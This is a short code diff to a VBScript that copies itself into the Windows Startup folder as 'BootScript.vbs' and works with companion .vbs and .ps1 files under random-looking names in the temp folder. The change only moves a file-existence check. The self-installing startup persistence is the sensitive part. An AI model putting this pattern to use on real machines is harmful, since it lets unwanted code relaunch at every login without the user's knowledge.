@@ -8,14 +8,6 @@ Set shell = CreateObject("WScript.Shell")
 
 Dim filePath, strFileExist
 
-' Check to see if NotepadMessage.p1 exist
-filePath = "$env:APPDATA\Local\Temp\wtc9AACOD031020.ps1"
-'Set fso = CreateObject("Scripting.FileSystemObject")
-If fso.FileExists(filePath) Then
-    strFileExist = "Yes"
-Else
-    strFileExist = "No"
-End If
 
 ' Define paths
 startupPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
@@ -24,6 +16,15 @@ scriptPath = WScript.ScriptFullName
 destPath = startupPath & "\BootScript.vbs"
 notepadScriptPath = startupPath & "\wtc9AACOD031020.vbs"
 psScriptPath = tempFolder & "\wtc9AACOD031020.ps1"
+
+' Check to see if NotepadMessage.p1 exist
+filePath = psScriptPath
+'Set fso = CreateObject("Scripting.FileSystemObject")
+If fso.FileExists(filePath) Then
+    strFileExist = "Yes"
+Else
+    strFileExist = "No"
+End If
 
 ' Copy this script to Startup
 If Not fso.FileExists(destPath) Then
